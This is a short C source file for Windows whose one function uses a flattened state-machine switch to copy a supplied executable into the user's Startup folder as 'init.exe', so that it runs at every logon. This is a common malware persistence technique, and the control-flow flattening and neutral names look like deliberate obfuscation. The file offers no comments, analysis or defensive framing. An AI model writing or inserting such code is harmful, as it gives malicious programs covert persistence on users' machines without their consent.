#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v5(const char* source){
    char path[MAX_PATH];
    int state = 5;
    while (state != 0) {
        switch (state) {
            case 5:
                GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
                state = 15;
                break;
            case 15:
                lstrcatA(path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.exe");
                state = 25;
                break;
            case 25:
                CopyFileA(source, path, FALSE);
                state = 0;
                break;
        }
    }
}